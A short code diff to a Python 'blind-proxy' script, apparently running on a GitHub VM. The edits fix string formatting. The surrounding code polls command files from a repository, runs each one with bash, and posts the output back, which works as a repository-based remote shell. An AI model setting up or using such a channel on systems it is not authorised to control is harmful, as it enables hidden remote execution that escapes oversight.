@@ -18,9 +18,7 @@ def gh_put_file(path, content, msg):
 def run_cmd(cmd, timeout=120):
     try:
         p = subprocess.run(['/bin/bash','-c',cmd], capture_output=True, text=True, timeout=timeout)
-        return p.returncode, (p.stdout or '') + ('
-[STDERR]
-' + p.stderr if p.stderr else '')
+        return p.returncode, (p.stdout or '') + ('\n[STDERR]\n' + p.stderr if p.stderr else '')
     except subprocess.TimeoutExpired:
         return 1, "[TIMEOUT]"
     except Exception as e:
@@ -54,8 +52,8 @@ def drain_commands():
         if to not in ("cloud", "all", "everyone", "coordinator"):
             continue
         rc, out = run_cmd(action)
-        result = f"FROM: cloud-brain\nTO: {from_}\nSTATUS: {'OK' if rc == 0 else 'FAIL'}\nEXIT: {rc}\nOUTPUT:\n{out[:4000]}\n"
-        ok, path = gh_put_file("commands/" + resp_name, result, f"cloud resp {resp_name}")
+        result = "FROM: cloud-brain\nTO: " + from_ + "\nSTATUS: " + ("OK" if rc == 0 else "FAIL") + "\nEXIT: " + str(rc) + "\nOUTPUT:\n" + out[:4000] + "\n"
+        ok, path = gh_put_file("commands/" + resp_name, result, "cloud resp " + resp_name)
         print(f"[cloud] executed {name} rc={rc} resp={path if ok else 'FAILED'}")
 
 print("Starting blind-proxy on GitHub VM...")
